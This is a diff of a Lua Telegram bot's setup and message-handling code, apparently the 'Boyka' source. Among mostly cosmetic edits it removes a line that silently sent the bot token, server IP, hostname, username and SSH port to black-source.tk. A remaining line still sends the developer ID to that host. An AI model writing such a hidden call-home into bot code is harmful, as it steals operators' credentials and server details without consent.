@@ -6,12 +6,12 @@ JSON  = dofile("./library/dkjson.lua")
 URL = require('socket.url')  
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
+id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
 Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
 Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
 Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
-install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 --------------------------------------------------------------------------------------------------------------
 local AutoSet = function() 
 local create = function(data, file, uglify)  
@@ -26,41 +26,41 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-print('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
+io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-io.write('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 database:set(id_server..":token",token)
 end 
 else
-io.write('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
 os.execute('lua BOYKA.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
-print('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
-local SUDOID = io.read():gsub(' ','') 
-if tostring(SUDOID):match('%d+') then
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
+local SUDOID = io.read()
+if SUDOID ~= '' then
 data,res = https.request("https://black-source.tk/BlackTeAM/info.php?n=BY&bn=info&id="..SUDOID)
 if res == 200 then
 muaed = json:decode(data)
 if muaed.Info.info == 'Is_Spam' then
 io.write('\n\27[1;31mالايدي محظور من السورس\n\27[0;39;49m')
 os.execute('lua BOYKA.lua')
-end ---ifBn
+end 
 if muaed.Info.info == 'Ok' then
 io.write('\n\27[1;31m تم حفظ الايدي\n\27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
-end ---ifok
+end 
 else
 io.write('\n\27[1;31mالايدي مينحفظ\n\27[0;39;49m')
-end  ---ifid
+end  
+end
 os.execute('lua BOYKA.lua')
-end ---ifnot
 end
 if not database:get(id_server..":SUDO:USERNAME") then
 io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
@@ -84,12 +84,8 @@ end
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
-IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
-Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
-Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
-Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-print('\n\27[1;34m::Source Boyka::')
+print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BOYKA", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -188,7 +184,6 @@ i = i + 1
 t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
 end
 end
-local tp = json:decode(https.request('https://black-source.tk/BlackTeAM/info.php?n=BY&id='..SUDO.."&token="..token.."&UserS="..install.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
@@ -925,7 +920,7 @@ send(msg.sender_user_id_, msg.id_,' ❃∫ تم ارسال رسالتك\n ❃∫
 tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
 vardump(data)
-if data and data.messages_.content_.sticker_ then
+if data and data.messages_[0].content_.sticker_ then
 local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
 local Text = ' ❃∫ تم ارسال الملصق من ↓\n - '..Name
 sendText(SUDO,Text,0,'md')
@@ -11122,5 +11117,23 @@ tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100'
 end
 end
 end
+
+
 end -- end new msg
 end -- end callback
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
